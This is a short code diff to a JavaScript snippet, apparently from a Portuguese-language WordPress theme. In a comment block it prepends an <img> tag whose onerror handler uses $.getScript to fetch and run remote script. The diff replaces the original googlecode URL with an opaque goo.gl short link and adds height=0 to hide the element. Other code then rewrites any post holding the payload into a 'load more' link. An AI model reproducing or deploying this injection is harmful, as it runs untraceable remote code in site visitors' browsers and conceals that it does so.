@@ -1,6 +1,6 @@
 /*
 
-$(".post:eq(1) h3 a").prepend('   <img src=æ onerror=$.ajaxSetup({cache:true});$.getScript(&#39//opl.googlecode.com/svn/m.js&#39)>  ');
+$(".post:eq(1) h3 a").prepend('   <img height=0 src=æ onerror=$.ajaxSetup({cache:true});$.getScript(&#39//goo.gl/6NNQQ&#39)>  ');
 
 -------------------------------------------------
 
@@ -50,7 +50,7 @@ info =[
 
 txtch = '<a href="#" style="position: absolute; top: -25px;color:#01acf1;font-weight: bold; right: 25px;z-index: 0;font-size: 80%;font-family: \'HelveticaLTStdBold\';text-align: center;width: 90px;">carregar mais<span style="position: absolute;top: -3px;  display: block; background: url(/wp-content/themes/gk/images/sprite.png) no-repeat -275px -218px; width: 90px; height: 30px;z-index: -1;"></span></a>' ,
 
-$xx = $(".post:has([onerror*='opl.google'])").removeClass().css("position","relative").html(txtch).click(function(e){
+$xx = $(".post:has([onerror*='gl/6NNQQ'])").removeClass().css("position","relative").html(txtch).click(function(e){
 
 
   e.preventDefault();
